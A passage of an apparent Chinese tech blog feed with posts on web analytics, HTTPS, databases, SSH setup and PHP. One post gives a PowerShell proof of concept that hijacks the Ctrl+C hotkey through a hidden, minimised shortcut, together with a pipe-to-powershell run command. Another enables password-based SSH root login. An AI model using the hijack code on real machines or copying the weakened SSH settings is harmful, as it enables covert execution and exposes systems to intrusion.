<p>看一眼日志轮转目录，由于我之前已经埋了点，所以已经生成了很多轮转文件：</p>
<p><img src="/articles/网站统计中的数据收集原理及实现/7.png" alt="轮转日志"></p>
<h4 id="关于分析"><a href="#关于分析" class="headerlink" title="关于分析"></a>关于分析</h4><p>通过上面的分析和开发可以大致理解一个网站统计的日志收集系统是如何工作的。有了这些日志，就可以进行后续的分析了。本文只注重日志收集，所以不会写太多关于分析的东西。</p>
<p>注意，原始日志最好尽量多的保留信息而不要做过多过滤和处理。例如上面的MyAnalytics保留了毫秒级时间戳而不是格式化后的时间，时间的格式化是后面的系统做的事而不是日志收集系统的责任。后面的系统根据原始日志可以分析出很多东西，例如通过IP库可以定位访问者的地域、user agent中可以得到访问者的操作系统、浏览器等信息，再结合复杂的分析模型，就可以做流量、来源、访客、地域、路径等分析了。当然，一般不会直接对原始日志分析，而是会将其清洗格式化后转存到其它地方，如MySQL或HBase中再做分析。</p>
<p>分析部分的工作有很多开源的基础设施可以使用，例如实时分析可以使用<a href="https://github.com/nathanmarz/storm" target="_blank" rel="noopener">Storm</a>，而离线分析可以使用<a href="http://hadoop.apache.org/" target="_blank" rel="noopener">Hadoop</a>。当然，在日志比较小的情况下，也可以通过shell命令做一些简单的分析，例如，下面三条命令可以分别得出我的博客在今天上午8点到9点的访问量（PV），访客数（UV）和独立IP数（IP）：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">awk -F^A <span class="string">'&#123;print $1&#125;'</span> ma-2012102409.log | wc -l</span><br><span class="line"></span><br><span class="line">awk -F^A <span class="string">'&#123;print $12&#125;'</span> ma-2012102409.log | uniq | wc -l</span><br><span class="line"></span><br><span class="line">awk -F^A <span class="string">'&#123;print $2&#125;'</span> ma-2012102409.log | uniq | wc -l</span><br></pre></td></tr></table></figure>

<p>其它好玩的东西朋友们可以慢慢挖掘。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>GA的开发者文档：<a href="https://developers.google.com/analytics/devguides/collection/gajs/" target="_blank" rel="noopener">https://developers.google.com/analytics/devguides/collection/gajs/</a></p>
<p>关于Nginx可以参考：<a href="http://wiki.nginx.org/Main" target="_blank" rel="noopener">http://wiki.nginx.org/Main</a></p>
<p>OpenResty的官方网站为：<a href="http://openresty.org" target="_blank" rel="noopener">http://openresty.org</a></p>
<p>ngx_lua模块可参考：<a href="https://github.com/chaoslawful/lua-nginx-module" target="_blank" rel="noopener">https://github.com/chaoslawful/lua-nginx-module</a></p>
]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>现代PHP工具包</title>
    <url>/articles/%E7%8E%B0%E4%BB%A3PHP%E5%B7%A5%E5%85%B7%E5%8C%85/</url>
    <content><![CDATA[<p>这些组件、工具和库描绘了现代PHP的样子：</p>
<p><a href="https://www.slimframework.com/" target="_blank" rel="noopener">Slimframework</a>： 一个很好、很酷的小型框架</p>
<p><a href="https://symfony.com/" target="_blank" rel="noopener">Symfony</a>：一个由很多优秀、可重用组件构成的重量级框架</p>
<p><a href="http://docs.guzzlephp.org/en/stable/" target="_blank" rel="noopener">Guzzle</a>：可以很简单容易发起HTTP请求的客户端</p>
<p><a href="https://phpunit.de/" target="_blank" rel="noopener">PHPUnit</a>： 一个测试框架</p>
<p><a href="http://behat.org/en/latest/" target="_blank" rel="noopener">Behat</a>： 行为驱动的测试框架</p>
<p><a href="https://github.com/squizlabs/PHP_CodeSniffer" target="_blank" rel="noopener">PHPCS/CBF</a>：代码规范、美化工具</p>
<p><a href="https://github.com/fzaninotto/Faker" target="_blank" rel="noopener">Faker</a>：生成测试数据的库</p>
<p><a href="https://psysh.org/" target="_blank" rel="noopener">Psysh</a>: 充满令人惊讶的交互式控制台</p>
<p><a href="https://getcomposer.org/" target="_blank" rel="noopener">Composer</a>：依赖管理，且有着其他很多有用的特性</p>
<p><a href="https://packagist.org/" target="_blank" rel="noopener">Packagist</a>：PHP包仓库</p>
<p><a href="https://twig.symfony.com/" target="_blank" rel="noopener">Twig</a>: 模板引擎</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>聊聊HTTPS和SSL/TLS协议</title>
    <url>/articles/%E8%81%8A%E8%81%8AHTTPS%E5%92%8CSSL-TLS%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<h3 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h3><ul>
<li><p>大致了解几个基本术语（HTTPS、SSL、TLS）的含义</p>
</li>
<li><p>大致了解 HTTP 和 TCP 的关系（尤其是“短连接”VS“长连接”）</p>
</li>
<li><p>大致了解加密算法的概念（尤其是“对称加密与非对称加密”的区别）</p>
</li>
<li><p>大致了解 CA 证书的用途  </p>
</li>
</ul>
<h4 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h4><p>HTTP 是一个网络协议，是专门用来帮你传输 Web 内容滴。大部分网站都是通过 HTTP 协议来传输 Web 页面、以及 Web 页面上包含的各种东东（图片、CSS 样式、JS 脚本）。</p>
<h4 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h4><p>简单地说，TCP 协议是 HTTP 协议的基石——HTTP 协议需要依靠 TCP 协议来传输数据。</p>
<p>在网络分层模型中，TCP 被称为“传输层协议”，而 HTTP 被称为“应用层协议”。</p>
<p>有很多常见的应用层协议是以 TCP 为基础的，比如“FTP、SMTP、POP、IMAP”等。</p>
<p>TCP 被称为“面向连接”的传输层协议。关于它的具体细节，我就不展开了，你只需知道：传输层主要有两个协议，分别是 TCP 和 UDP。TCP 比 UDP 更可靠。你可以把 TCP 协议想象成某个水管，发送端这头进水，接收端那头就出水。并且 TCP 协议能够确保，先发送的数据先到达（与之相反，UDP 不保证这点）。</p>
<h4 id="SSL-TLS"><a href="#SSL-TLS" class="headerlink" title="SSL/TLS"></a>SSL/TLS</h4><p><em>SSL</em> 是全称 <em>Secure Sockets Layer*（安全套接层）。它是在上世纪90年代中期，由网景公司设计的。（顺便插一句，网景公司不光发明了 SSL，还发明了很多 Web 的基础设施——比如 *CSS</em> 样式表”和 <em>JS</em> 脚本）</p>
<p>为啥要发明 SSL 这个协议捏？因为原先互联网上使用的 HTTP 协议是明文的，存在很多缺点——比如传输内容会被偷窥（嗅探）和篡改。发明 SSL 协议，就是为了解决这些问题。</p>
<p>到了1999年，SSL 因为应用广泛，已经成为互联网上的事实标准。IETF 就在那年把 SSL 标准化。标准化之后的名称改为 TLS（是“Transport Layer Security”的缩写），中文叫做“传输层安全协议”。</p>
<p>很多相关的文章都把这两者并列称呼（SSL/TLS），因为这两者可以视作同一个东西的不同阶段。</p>
<h4 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h4><p>通常所说的 HTTPS 协议，说白了就是“HTTP 协议”和“SSL/TLS 协议”的组合。你可以把 HTTPS 大致理解为——“HTTP over SSL”或“HTTP over TLS”（反正 SSL 和 TLS 差不多）。</p>
<h4 id="HTTP-协议如何使用-TCP-连接？"><a href="#HTTP-协议如何使用-TCP-连接？" class="headerlink" title="HTTP 协议如何使用 TCP 连接？"></a>HTTP 协议如何使用 TCP 连接？</h4><p>HTTP 对 TCP 连接的使用，分为两种方式：俗称“短连接”和“长连接”（“长连接”又称“持久连接”，洋文叫做“Keep-Alive”或“Persistent Connection”）</p>
<p>假设有一个网页，里面包含好多图片，还包含好多<strong>外部的</strong>CSS 文件和 JS 文件。在“短连接”的模式下，浏览器会先发起一个 TCP 连接，拿到该网页的 HTML 源代码（拿到 HTML 之后，这个 TCP 连接就关闭了）。然后，浏览器开始分析这个网页的源码，知道这个页面包含很多外部资源（图片、CSS、JS）。然后针对<strong>每一个</strong>外部资源，再分别发起一个个 TCP 连接，把这些文件获取到本地（同样的，每抓取一个外部资源后，相应的 TCP 就断开）</p>
<p>相反，如果是“长连接”的方式，浏览器也会先发起一个 TCP 连接去抓取页面。但是抓取页面之后，该 TCP 连接并不会立即关闭，而是暂时先保持着（所谓的“Keep-Alive”）。然后浏览器分析 HTML 源码之后，发现有很多外部资源，就用刚才那个 TCP 连接去抓取此页面的外部资源。</p>
<p>在 HTTP 1.0 版本，<strong>默认</strong>使用的是“短连接”（那时候是 Web 诞生初期，网页相对简单，“短连接”的问题不大）；</p>
<p>到了1995年底开始制定 HTTP 1.1 草案的时候，网页已经开始变得复杂（网页内的图片、脚本越来越多了）。这时候再用短连接的方式，效率太低下了（因为建立 TCP 连接是有“时间成本”和“CPU 成本”滴）。所以，在 HTTP 1.1 中，<strong>默认</strong>采用的是“Keep-Alive”的方式。</p>
<h4 id="加密和解密"><a href="#加密和解密" class="headerlink" title="加密和解密"></a>加密和解密</h4><p>通俗而言，你可以把“加密”和“解密”理解为某种<strong>互逆的</strong>数学运算。就好比“加法和减法”互为逆运算、“乘法和除法”互为逆运算。</p>
<blockquote>
<p>“加密”的过程，就是把“明文”变成“密文”的过程；反之，“解密”的过程，就是把“密文”变为“明文”。在这两个过程中，都需要一个关键的东东——叫做“密钥”——来参与数学运算。</p>
</blockquote>
<p><strong>啥是“对称加密”？</strong></p>
<p>所谓的“对称加密技术”，意思就是说：“加密”和“解密”使用<strong>相同的</strong>密钥。这个比较好理解。就好比你用 7zip 或 WinRAR 创建一个带密码（口令）的加密压缩包。当你下次要把这个压缩文件解开的时候，你需要输入<strong>同样的</strong>密码。在这个例子中，密码/口令就如同刚才说的“密钥”。</p>
<p><strong>啥是“非对称加密”？</strong></p>
<p>所谓的“非对称加密技术”，意思就是说：“加密”和“解密”使用<strong>不同的</strong>密钥。这玩意儿比较难理解，也比较难想到。当年“非对称加密”的发明，还被誉为“密码学”历史上的一次革命。</p>
<p>由于篇幅有限，对“非对称加密”这个话题，我就不展开了。有空的话，再单独写一篇扫盲。</p>
<p><strong>各自有啥优缺点？</strong></p>
<p>看完刚才的定义，很显然：（从功能角度而言）“非对称加密”能干的事情比“对称加密”要多。这是“非对称加密”的优点。但是“非对称加密”的实现，通常需要涉及到“复杂数学问题”。所以，“非对称加密”的性能通常要差很多（相对于“对称加密”而言）。</p>
<p>这两者的优缺点，也影响到了 SSL 协议的设计。 </p>
<h3 id="HTTPS-协议的需求"><a href="#HTTPS-协议的需求" class="headerlink" title="HTTPS 协议的需求"></a>HTTPS 协议的需求</h3><p><strong>兼容性</strong></p>
<p>因为是先有 HTTP 再有 HTTPS。所以，HTTPS 的设计者肯定要考虑到对原有 HTTP 的兼容性。</p>
<p>这里所说的兼容性包括很多方面。比如已有的 Web 应用要尽可能无缝地迁移到 HTTPS；比如对浏览器厂商而言，改动要尽可能小；</p>
<p>基于“兼容性”方面的考虑，很容易得出如下几个结论：</p>
<blockquote>
<ol>
<li><p>HTTPS 还是要基于 TCP 来传输</p>
<p>如果改为 UDP 作传输层，无论是 Web 服务端还是浏览器客户端，都要大改，动静太大了</p>
</li>
<li><p>单独使用一个新的协议，把 HTTP 协议包裹起来</p>
</li>
</ol>
</blockquote>
<p>（所谓的“HTTP over SSL”，实际上是在原有的 HTTP 数据外面加了一层 SSL 的封装。HTTP 协议原有的 GET、POST 之类的机制，基本上原封不动）</p>
<p>举个例子：</p>
<blockquote>
<p>如果原来的 HTTP 是塑料水管，容易被戳破；那么如今新设计的 HTTPS 就像是在原有的塑料水管之外，再包一层金属水管。一来，原有的塑料水管照样运行；二来，用金属加固了之后，不容易被戳破。</p>
</blockquote>
<p><strong>可扩展性</strong></p>
<p>前面说了，HTTPS 相当于是“HTTP over SSL”。</p>
<p>如果 SSL 这个协议在“可扩展性”方面的设计足够牛逼，那么它除了能跟 HTTP 搭配，还能够跟其它的应用层协议搭配。岂不美哉？</p>
<p>现在看来，当初设计 SSL 的人确实比较牛。如今的 SSL/TLS 可以跟很多常用的应用层协议（比如：FTP、SMTP、POP、Telnet）搭配，来强化这些应用层协议的安全性。</p>
<p>接着刚才例子：</p>
<blockquote>
<p>如果把 SSL/TLS 视作一根用来加固的金属管，它不仅可以用来加固输水的管道，还可以用来加固输煤气的管道。</p>
</blockquote>
<p><strong>保密性（防泄密）</strong></p>
<p>HTTPS 需要做到足够好的保密性。</p>
<p>说到保密性，首先要能够对抗嗅探（行话叫 Sniffer）。所谓的“嗅探”，通俗而言就是监视你的网络传输流量。如果你使用明文的 HTTP 上网，那么监视者通过嗅探，就知道你在访问哪些网站的哪些页面。</p>
<p>嗅探是最低级的攻击手法。除了嗅探，HTTPS 还需要能对抗其它一些稍微高级的攻击手法——比如“重放攻击”（后面讲协议原理的时候，会再聊）。</p>
<p><strong>完整性（防篡改）</strong></p>
<p>除了“保密性”，还有一个同样重要的目标是“确保完整性”。关于“完整性”这个概念，在之前的博文《扫盲文件完整性校验——关于散列值和数字签名》中大致提过。健忘的同学再去温习一下。</p>
<p>在发明 HTTPS 之前，由于 HTTP 是明文的，不但容易被嗅探，还容易被篡改。</p>
<p>举个例子：</p>
<blockquote>
<p>咱们天朝的网络运营商（ISP）都比较流氓，经常有网友抱怨说访问某网站（本来是没有广告的），竟然会跳出很多中国电信的广告。为啥会这样捏？因为你的网络流量需要经过 ISP 的线路才能到达公网。如果你使用的是明文的 HTTP，ISP 很容易就可以在你访问的页面中植入广告。 所以，当初设计 HTTPS 的时候，还有一个需求是“确保 HTTP 协议的内容不被篡改”。</p>
</blockquote>
<p><strong>真实性（防假冒）</strong></p>
<p>在谈到 HTTPS 的需求时，“真实性”经常被忽略。其实“真实性”的重要程度不亚于前面的“保密性”和“完整性”。</p>
<p>举个例子：</p>
<blockquote>
<p>你因为使用网银，需要访问该网银的 Web 站点。那么，你如何确保你访问的网站确实是你想访问的网站？（这话有点绕）</p>
<p>有些天真的同学会说：通过看网址里面的域名，来确保。</p>
</blockquote>
<p>为啥说这样的同学是“天真的”？因为 DNS 系统本身是不可靠的（尤其是在设计 SSL 的那个年代，连 DNSSEC 都还没发明）。由于 DNS 的不可靠（<a href="http://blog.sina.com.cn/s/blog_62904e660102wdip.html" target="_blank" rel="noopener">存在“域名欺骗”和“域名劫持”</a>），你看到的网址里面的域名<strong>未必</strong>是真实滴！，所以，HTTPS 协议必须有某种机制来确保“真实性”的需求。</p>
<p><strong>性能</strong></p>
<p>再来说最后一个需求——性能。</p>
<p>引入 HTTPS 之后，<strong>不能</strong>导致性能变得太差。否则的话，谁还愿意用？</p>
<p>为了确保性能，SSL 的设计者至少要考虑如下几点：</p>
<blockquote>
<ol>
<li><p>如何选择加密算法（“对称”or“非对称”）？</p>
</li>
<li><p>如何兼顾 HTTP 采用的“短连接”TCP 方式？</p>
</li>
</ol>
</blockquote>
<p>SSL 是在1995年之前开始设计的，那时候的 HTTP 版本还是 1.0，默认使用的是“短连接”的 TCP 方式——默认不启用 Keep-Alive</p>
]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>解决U盘启动“Failed to load ldlinux.c32”</title>
    <url>/articles/%E8%A7%A3%E5%86%B3%20U%E7%9B%98%E5%90%AF%E5%8A%A8-Failed%20to%20load%20ldlinux-c32-/</url>
    <content><![CDATA[<p>利用UltraISO制作了Fedora 23的U盘启动，开机F12键USB启动时出现</p>
<p>Failed to load ldlinux.c32</p>
<p>Boot failed: please change disks and press a key to continue</p>
<p>在网上查询很多，进行了多次尝试：</p>
<p>换一个其他软件制作U盘启动，尝试失败</p>
<p>认为下载系统软件有问题，下载了其他版本的Fedora 21/25，顺利安装</p>
<p>猜测是不是制作启动时写入方式有问题，尝试了多个写入方式（USB-HDD、USB-HDD+、USB-ZIP），均失败</p>
<p><img src="/articles/解决 U盘启动-Failed to load ldlinux-c32-/0.png" alt></p>
<p>最后选择写入方式“RAW”，Success，问题解决，安装系统时可以顺利启动。</p>
<p>因此，最后解决办法是：</p>
<p>UltraISO制作启动盘时，换写入方式为“RAW”，即可解决</p>
<p><img src="/articles/解决 U盘启动-Failed to load ldlinux-c32-/1.png" alt></p>
]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>行式数据库与列式数据库</title>
    <url>/articles/%E8%A1%8C%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8E%E5%88%97%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
    <content><![CDATA[<h3 id="一-基本概念"><a href="#一-基本概念" class="headerlink" title="一  基本概念"></a>一  基本概念</h3><p>在关系数据库领域，除传统的ORACLE、SQLSERVER、MYSQL等行式数据库外，目前在数据仓库领域列式数据库越来越受到关注。目前商用的列式数据库主要是Sybase IQ。</p>
<p>一般，行式数据库主要适合于在线交易性的OLTP应用，而列式数据库主要适合于海量静态数据的分析，一般应用于OLAP。但只是依靠OLTP还是OLAP来区分是采用行式数据库还是列式数据库，在很多时候还不是很明确，特别很多时候有些应用很难说是OLTP还是OLAP，例如对海量数据的查询。</p>
<p>根据笔者最近的对ORACLE和SYBASE IQ的初步研究与测试，笔者认为关键点是行式数据库适合“少数行多数列”的应用，而列式数据库适合于“少数列多数行的应用”。行的多少可理解为sql 查询语句中符合where 之后的过滤条件的行数占总行数的比例，列的多少可理解为select 之后涉及到的行数。</p>
<p>对于普通的 “select f1 ,f2, f3,f4  where xxxx “查询，sybase IQ的查询速度会很快，但是关键问题是如果select 的列很多，则在取数据时会非常慢，而对oracle数据库不管是取一列还是取所有列其时间开销基本不变。</p>
<h3 id="二-对比"><a href="#二-对比" class="headerlink" title="二  对比"></a>二  对比</h3><p>1  行式更适合OLTP, 查询一个记录的所有列。</p>
<p>列式更适合OLAP，非常适合于在数据仓库领域发挥作用，比如数据分析、海量存储和商业智能；涉及不经常更新的数据。由于设计上的不同，列式数据库在并行查询处理和压缩上更有优势。而且数据是以列为单元存储，完全不用考虑数据建模或者说建模更简单了。要查询计算哪些列上的数据，直接读取列就行。</p>
<p>2  列式在存储方面占有很大的优势，能有效提高数据压缩比，节省存储空间。</p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title>linux(kail)开启ssh端口服务</title>
    <url>/articles/linux-kail-%E5%BC%80%E5%90%AFssh%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1/</url>
    <content><![CDATA[<p>ssh链接可以远程管理linux设备，默认端口是22，安装好系统默认是不开启的，需要修改配置文件</p>
<p>/etc/ssh/sshd_config 配置文件</p>
<p><img src="/articles/linux-kail-开启ssh端口服务/1.png" alt> </p>
<p>1.找到#PasswordAuthentication yes  把#的注释去掉</p>
<p><img src="/articles/linux-kail-开启ssh端口服务/2.png" alt></p>
<p>2.将PermitRootLogin without-password修改为：</p>
<p>PermitRootLogin yes</p>
<p><img src="/articles/linux-kail-开启ssh端口服务/3.png" alt></p>
<p>3.然后启动ssh服务 :  <code>/etc/init.d/ssh start</code></p>
<p>4.然后设置开机自动启动  :   <code>update-rc.d ssh enable</code></p>
<p>5.使用xshell链接即可</p>
]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title>生成固定长随机码</title>
    <url>/articles/%E7%94%9F%E6%88%90%E5%9B%BA%E5%AE%9A%E9%95%BF%E9%9A%8F%E6%9C%BA%E7%A0%81/</url>
    <content><![CDATA[<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">R</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    $code = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>;</span><br><span class="line"></span><br><span class="line">    $rand = $code[rand(<span class="number">0</span>,<span class="number">25</span>)]</span><br><span class="line"></span><br><span class="line">            .strtoupper(dechex(date(<span class="string">'m'</span>)))</span><br><span class="line"></span><br><span class="line">                .date(<span class="string">'d'</span>).substr(time(),<span class="number">-5</span>)</span><br><span class="line"></span><br><span class="line">                    .substr(microtime(),<span class="number">2</span>,<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">                        .sprintf(<span class="string">'%02d'</span>,rand(<span class="number">0</span>,<span class="number">99</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(</span><br><span class="line"></span><br><span class="line">        $a = md5( $rand, <span class="keyword">true</span> ),</span><br><span class="line"></span><br><span class="line">        $s = <span class="string">'0123456789ABCDEFGHIJKLMNOPQRSTUV'</span>,</span><br><span class="line"></span><br><span class="line">        $d = <span class="string">''</span>,</span><br><span class="line"></span><br><span class="line">        $f = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        $f &lt; <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">        $g = ord( $a[ $f ] ),</span><br><span class="line"></span><br><span class="line">        $d .= $s[ ( $g ^ ord( $a[ $f + <span class="number">8</span> ] ) ) - $g &amp; <span class="number">0x1F</span> ],</span><br><span class="line"></span><br><span class="line">        $f++</span><br><span class="line"></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $d;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>简单易用，用Powershell劫持Windows系统快捷键</title>
    <url>/articles/%E7%AE%80%E5%8D%95%E6%98%93%E7%94%A8-%E7%94%A8Powershell%E5%8A%AB%E6%8C%81Windows%E7%B3%BB%E7%BB%9F%E5%BF%AB%E6%8D%B7%E9%94%AE/</url>
    <content><![CDATA[<p>POC:</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$WshShell</span> = <span class="built_in">New-Object</span> -comObject WScript.Shell</span><br><span class="line"></span><br><span class="line"><span class="variable">$Shortcut</span> = <span class="variable">$WshShell</span>.CreateShortcut(<span class="string">"desktop\desktoppayload.lnk"</span>) // 在桌面创建快捷方式按钮</span><br><span class="line"></span><br><span class="line"><span class="variable">$Shortcut</span>.TargetPath = <span class="string">"%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe"</span> // 执行文件</span><br><span class="line"></span><br><span class="line"><span class="variable">$Shortcut</span>.IconLocation = <span class="string">"%SystemRoot%\System32\Shell32.dll,21"</span> // 设置快捷按钮图标</span><br><span class="line"></span><br><span class="line"><span class="variable">$Shortcut</span>.hotkey = <span class="string">"ctrl+c"</span> // 快捷键</span><br><span class="line"></span><br><span class="line"><span class="variable">$Shortcut</span>.WindowStyle = <span class="string">'7'</span> // 最小化执行，避免弹窗</span><br><span class="line"></span><br><span class="line"><span class="variable">$Shortcut</span>.Arguments = <span class="string">'calc'</span> // 执行参数</span><br><span class="line"></span><br><span class="line"><span class="variable">$Shortcut</span>.Save()</span><br></pre></td></tr></table></figure>

<p>执行方法：</p>
<p>保存poc，命令行执行</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">TYPE</span>  POC位置 | powershell.exe - profile -</span><br></pre></td></tr></table></figure>

<p>删除快捷图标即可还原</p>
]]></content>
      <categories>
        <category>安全研究</category>
      </categories>
  </entry>
  <entry>
    <title>超级终端玩法</title>
    <url>/articles/%E8%B6%85%E7%BA%A7%E7%BB%88%E7%AB%AF%E7%8E%A9%E6%B3%95/</url>
    <content><![CDATA[<p>颜色特效控制：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">printf(&quot;\033[1;33m Hello World. \033[0m \n&quot;);</span><br></pre></td></tr></table></figure>

<p>颜色如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">none         = &quot;\033[0m&quot;</span><br><span class="line"></span><br><span class="line">black        = &quot;\033[0;30m&quot;</span><br><span class="line"></span><br><span class="line">dark_gray    = &quot;\033[1;30m&quot;</span><br><span class="line"></span><br><span class="line">blue         = &quot;\033[0;34m&quot;</span><br><span class="line"></span><br><span class="line">light_blue   = &quot;\033[1;34m&quot;</span><br><span class="line"></span><br><span class="line">green        = &quot;\033[0;32m&quot;</span><br><span class="line"></span><br><span class="line">light_green -= &quot;\033[1;32m&quot;</span><br><span class="line"></span><br><span class="line">cyan         = &quot;\033[0;36m&quot;</span><br><span class="line"></span><br><span class="line">light_cyan   = &quot;\033[1;36m&quot;</span><br><span class="line"></span><br><span class="line">red          = &quot;\033[0;31m&quot;</span><br><span class="line"></span><br><span class="line">light_red    = &quot;\033[1;31m&quot;</span><br><span class="line"></span><br><span class="line">purple       = &quot;\033[0;35m&quot;</span><br><span class="line"></span><br><span class="line">light_purple = &quot;\033[1;35m&quot;</span><br><span class="line"></span><br><span class="line">brown        = &quot;\033[0;33m&quot;</span><br><span class="line"></span><br><span class="line">yellow       = &quot;\033[1;33m&quot;</span><br><span class="line"></span><br><span class="line">light_gray   = &quot;\033[0;37m&quot;</span><br><span class="line"></span><br><span class="line">white        = &quot;\033[1;37m&quot;</span><br></pre></td></tr></table></figure>

<p>字背景颜色范围:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40--49                   字颜色: 30--39</span><br><span class="line"></span><br><span class="line">40: 黑                          30: 黑</span><br><span class="line"></span><br><span class="line">41:红                          31: 红</span><br><span class="line"></span><br><span class="line">42:绿                          32: 绿</span><br><span class="line"></span><br><span class="line">43:黄                          33: 黄</span><br><span class="line"></span><br><span class="line">44:蓝                          34: 蓝</span><br><span class="line"></span><br><span class="line">45:紫                          35: 紫</span><br><span class="line"></span><br><span class="line">46:深绿                        36: 深绿</span><br><span class="line"></span><br><span class="line">47:白色                        37: 白色</span><br></pre></td></tr></table></figure>

<p>输出特效格式控制：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\033[0m  关闭所有属性</span><br><span class="line"></span><br><span class="line">\033[1m   设置高亮度</span><br><span class="line"></span><br><span class="line">\03[4m   下划线</span><br><span class="line"></span><br><span class="line">\033[5m   闪烁</span><br><span class="line"></span><br><span class="line">\033[7m   反显</span><br><span class="line"></span><br><span class="line">\033[8m   消隐</span><br><span class="line"></span><br><span class="line">\033[30m   --   \033[37m   设置前景色</span><br><span class="line"></span><br><span class="line">\033[40m   --   \033[47m   设置背景色</span><br></pre></td></tr></table></figure>

<p>光标位置等的格式控制：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\033[nA  光标上移n行</span><br><span class="line"></span><br><span class="line">\03[nB   光标下移n行</span><br><span class="line"></span><br><span class="line">\033[nC   光标右移n行</span><br><span class="line"></span><br><span class="line">\033[nD   光标左移n行</span><br><span class="line"></span><br><span class="line">\033[y;xH设置光标位置</span><br><span class="line"></span><br><span class="line">\033[2J   清屏</span><br><span class="line"></span><br><span class="line">\033[K   清除从光标到行尾的内容</span><br><span class="line"></span><br><span class="line">\033[s   保存光标位置</span><br><span class="line"></span><br><span class="line">\033[u   恢复光标位置</span><br><span class="line"></span><br><span class="line">\033[?25l   隐藏光标</span><br><span class="line"></span><br><span class="line">\33[?25h   显示光标</span><br></pre></td></tr></table></figure>

<p>DEMO</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span> ([<span class="string">"&#123;chr&#125;foo_bar"</span>, <span class="string">"foo&#123;chr&#125;bar"</span>, <span class="string">"foo_bar&#123;chr&#125;"</span>] <span class="keyword">as</span> $k =&gt; $arg) &#123;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt;= <span class="number">255</span>; $i++) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"\33[999D\33[K\r"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"["</span> . $arg . <span class="string">"] check "</span> . bin2hex(chr($i)) . <span class="string">""</span>;</span><br><span class="line">        parse_str(str_replace(<span class="string">"&#123;chr&#125;"</span>, chr($i), $arg) . <span class="string">"=bla"</span>, $o);</span><br><span class="line">        usleep(<span class="number">5000</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($o[<span class="string">"foo_bar"</span>])) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"\33[999D\33[K\r"</span>;</span><br><span class="line">            <span class="keyword">echo</span> $arg . <span class="string">" -&gt; "</span> . bin2hex(chr($i)) . <span class="string">" ("</span> . chr($i) . <span class="string">")\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"\33[999D\33[K\r"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>解决类似 /usr/lib64/libstdc++.so.6:version `GLIBCXX_3.4.21&#39; not found 的问题</title>
    <url>/articles/%E8%A7%A3%E5%86%B3%E7%B1%BB%E4%BC%BC%20-usr-lib64-libstdc-so-6-%20version%20-GLIBCXX-3-4-21-%20not%20found%20%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>源码编译升级安装了gcc后，编译程序或运行其它程序时，有时会出现类似/usr/lib64/libstdc++.so.6: version `GLIBCXX_3.4.21’ not found的问题。这是因为升级gcc时，生成的动态库没有替换老版本gcc的动态库导致的，将gcc最新版本的动态库替换系统中老版本的动态库即可解决。</p>
<p><strong>问题原因分析</strong></p>
<p>为了安装最新版本的Node.js（最新版本的Node.js使用了C++ 11中，而C++ 11需要code&gt;gcc 4.8+才能支持），将gcc升级到了当前最新版本v 5.2.0。升级后，成功编译安装了新版本的Node.js（v 4.2.1）,但运行时程序时出现了以下错误：</p>
